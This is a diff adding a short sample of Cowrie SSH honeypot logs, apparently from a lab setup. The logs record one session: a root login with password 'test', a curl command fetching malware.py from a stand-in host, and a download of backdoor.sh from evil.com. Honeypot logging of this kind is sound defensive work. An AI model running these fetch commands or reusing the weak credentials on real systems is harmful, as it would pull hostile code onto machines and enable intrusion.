@@ -1,1 +1,34 @@
 logs-sample
+
+{
+  "eventid": "cowrie.command.input",
+  "input": "curl http://badhost.xyz/malware.py",
+  "message": "CMD: curl http://badhost.xyz/malware.py",
+  "sensor": "kali",
+  "timestamp": "2025-05-30T10:29:40.584085Z",
+  "src_ip": "192.168.1.5",
+  "session": "3ec6d437dd86"
+}
+
+{
+  "eventid": "cowrie.session.file_download",
+  "url": "http://evil.com/backdoor.sh",
+  "outfile": "var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0",
+  "shasum": "dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0",
+  "sensor": "kali",
+  "timestamp": "2025-05-30T10:29:27.039815Z",
+  "message": "Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0",
+  "src_ip": "192.168.1.5",
+  "session": "3ec6d437dd86"
+}
+
+{
+  "eventid": "cowrie.login.success",
+  "username": "root",
+  "password": "test",
+  "message": "login attempt [root/test] succeeded",
+  "sensor": "kali",
+  "timestamp": "2025-05-30T10:29:16.344724Z",
+  "src_ip": "192.168.1.5",
+  "session": "3ec6d437dd86"
+}
